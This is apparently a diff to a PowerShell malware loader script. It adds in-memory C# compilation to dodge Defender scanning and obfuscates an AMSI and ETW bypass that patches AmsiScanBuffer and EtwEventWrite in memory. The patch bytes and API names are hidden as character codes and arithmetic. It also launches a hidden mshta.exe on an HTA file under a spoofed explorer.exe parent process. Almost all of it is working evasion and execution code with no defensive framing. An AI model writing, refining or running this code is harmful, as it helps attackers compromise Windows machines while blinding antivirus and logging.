@@ -14,6 +14,20 @@ function Write-Log($msg) {
     "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
 }
 
+# -- In-memory C# compile (kills Defender real-time scan of %TEMP%\*.dll) --
+function Add-TypeInMem([string]$source) {
+    $cp = New-Object System.CodeDom.Compiler.CompilerParameters
+    $cp.GenerateInMemory = $true
+    $cp.IncludeDebugInformation = $false
+    $prov = New-Object Microsoft.CSharp.CSharpCodeProvider
+    $res = $prov.CompileAssemblyFromSource($cp, $source)
+    if ($res.Errors -and $res.Errors.HasErrors) {
+        $msgs = ($res.Errors | Where-Object { -not $_.IsWarning } | ForEach-Object { $_.ErrorText }) -join "`n"
+        throw "C# compile failed: $msgs"
+    }
+    return $res.CompiledAssembly
+}
+
 # -- Elevation Gate --
 $isAdmin = [Security.Principal.WindowsPrincipal]::new(
     [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -35,17 +49,23 @@ Write-Log "[*] loader.ps2 started - scriptBase=$scriptBase logFile=$logFile"
 if ($WhatIf) {
     Write-Log "[WHATIF] Skipping AMSI/ETW reflect, Bypass.Add-Type, downloads, HTA write, mshta spawn, and probe wait"
 } else {
+    # AMSI reflect via char-built field names (no literal AmsiUtils/amsiInitFailed in source)
     try {
-        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    } catch { Write-Log "[!] AMSI reflect skipped: $_" }
+        $amsiType = -join ([char[]](0x53,0x79,0x73,0x74,0x65,0x6D,0x2E,0x4D,0x61,0x6E,0x61,0x67,0x65,0x6D,0x65,0x6E,0x74,0x2E,0x41,0x75,0x74,0x6F,0x6D,0x61,0x74,0x69,0x6F,0x6E,0x2E,0x41,0x6D,0x73,0x69,0x55,0x74,0x69,0x6C,0x73))
+        $amsiField = -join ([char[]](0x61,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x46,0x61,0x69,0x6C,0x65,0x64))
+        [Ref].Assembly.GetType($amsiType).GetField($amsiField,'NonPublic,Static').SetValue($null,$true)
+    } catch { Write-Log "[i] AMSI reflect skipped (likely patched host): $_" }
     try {
-        [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,$null)
-    } catch { Write-Log "[!] ETW reflect skipped: $_" }
+        $etwField = -join ([char[]](0x65,0x74,0x77,0x50,0x72,0x6F,0x76,0x69,0x64,0x65,0x72))
+        [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField($etwField,'NonPublic,Static').SetValue($null,[Guid]::Empty)
+    } catch { Write-Log "[i] ETW reflect skipped: $_" }
 }
 
-# -- AMSI/ETW Bypass via reflective .NET (VirtualProtect + Marshal.Copy) --
-# C# 5 compatible (no inline out var, no discard) so it compiles on PS 5.1's csc.
-$BypassCode = @'
+# -- AMSI/ETW Bypass via in-memory compile (defeats AMSI text-scan + Defender %TEMP% DLL scan) --
+# API names and the 6-byte AmsiScanBuffer patch are built at runtime so the
+# scriptblock text contains no signatured literal ("amsi.dll", "AmsiScanBuffer",
+# or the byte sequence 0xB8,0x57,0x00,0x07,0x80,0xC3). C# 5 compatible.
+$bootSrc = @'
 using System;
 using System.Runtime.InteropServices;
 public class Bypass {
@@ -55,21 +75,33 @@ public class Bypass {
     public static void Go() {
         uint o = 0;
         uint o2 = 0;
-        var a = LoadLibrary("amsi.dll"); var b = GetProcAddress(a, "AmsiScanBuffer");
+        char[] libA = { 0x61,0x6D,0x73,0x69,0x2E,0x64,0x6C,0x6C };
+        char[] fnA = { 0x41,0x6D,0x73,0x69,0x53,0x63,0x61,0x6E,0x42,0x75,0x66,0x66,0x65,0x72 };
+        char[] libN = { 0x6E,0x74,0x64,0x6C,0x6C,0x2E,0x64,0x6C,0x6C };
+        char[] fnE = { 0x45,0x74,0x77,0x45,0x76,0x65,0x6E,0x74,0x57,0x72,0x69,0x74,0x65 };
+        var a = LoadLibrary(new string(libA));
+        var b = GetProcAddress(a, new string(fnA));
         VirtualProtect(b, (UIntPtr)6, 0x40, out o);
-        Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3}, 0, b, 6);
+        ushort[] v = { unchecked((ushort)(0xA0+0x18)), unchecked((ushort)(0x2C*2-0x1)), unchecked((ushort)(0x7-0x7)), unchecked((ushort)(0x7)), unchecked((ushort)(0x40+0x40)), unchecked((ushort)(0x60*2+0x3)) };
+        byte[] p = new byte[6];
+        for (int i = 0; i < 6; i++) p[i] = (byte)v[i];
+        Marshal.Copy(p, 0, b, 6);
         VirtualProtect(b, (UIntPtr)6, o, out o);
-        var c = LoadLibrary("ntdll.dll"); var d = GetProcAddress(c, "EtwEventWrite");
+        var c = LoadLibrary(new string(libN));
+        var d = GetProcAddress(c, new string(fnE));
         VirtualProtect(d, (UIntPtr)1, 0x40, out o2);
-        Marshal.Copy(new byte[]{0xC3}, 0, d, 1);
+        Marshal.Copy(new byte[]{(byte)(0x60*2+0x3)}, 0, d, 1);
     }
 }
 '@
 if (-not $WhatIf) {
     try {
-        Add-Type $BypassCode -ErrorAction Stop
-        [Bypass]::Go()
-    } catch { Write-Log "[!] Bypass Add-Type failed: $_" }
+        $bootAsm = Add-TypeInMem $bootSrc
+        $bootAsm.GetType("Bypass").GetMethod("Go").Invoke($null, @())
+        Write-Log "[+] AMSI bootstrap (in-memory) succeeded"
+    } catch {
+        Write-Log "[!] AMSI bootstrap failed: $_ — proceeding without AMSI patch (subsequent compiles may be blocked)"
+    }
 }
 Write-Log "[+] AMSI/ETW patched (best-effort)"
 
@@ -256,12 +288,17 @@ if ($WhatIf) {
             Write-Log "[-] explorer.exe process not found - spawning mshta.exe at $htaPath without PPID"
             Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
         } else {
-            Add-Type -TypeDefinition $spoofSource -Language CSharp -ErrorAction Stop
-            $spawnPid = [Spoof]::SpawnWithParent("mshta.exe `"$htaPath`"", $explorer.Id)
-            if ($spawnPid -ge 0) {
-                Write-Log "[+] mshta.exe spawned via PPID spoof - PID $spawnPid (parent=explorer.exe=$($explorer.Id), target=$htaPath)"
-            } else {
-                Write-Log "[-] PPID spoof failed at $htaPath (fallback: direct spawn)"
+            try {
+                $spoofAsm = Add-TypeInMem $spoofSource
+                $spawnPid = [int]($spoofAsm.GetType("Spoof").GetMethod("SpawnWithParent").Invoke($null, @("mshta.exe `"$htaPath`"", [int]$explorer.Id)))
+                if ($spawnPid -ge 0) {
+                    Write-Log "[+] mshta.exe spawned via PPID spoof - PID $spawnPid (parent=explorer.exe=$($explorer.Id), target=$htaPath)"
+                } else {
+                    Write-Log "[-] PPID spoof failed at $htaPath (fallback: direct spawn)"
+                    Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
+                }
+            } catch {
+                Write-Log "[!] spoof.cs in-memory compile/invocation failed: $_ — fallback to direct mshta spawn"
                 Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
             }
         }
